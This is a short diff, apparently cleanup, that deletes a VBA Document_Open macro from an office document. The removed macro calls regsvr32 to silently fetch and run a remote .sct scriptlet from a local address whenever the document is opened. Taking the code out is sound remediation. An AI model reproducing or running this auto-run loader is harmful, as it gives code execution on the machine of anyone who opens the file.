@@ -1,3 +1,0 @@
-Private Sub Document_Open()
-  Shell "regsvr32 /s /n /u /i:http://127.0.0.1:8080/file.sct scrobj.dll"
-End Sub
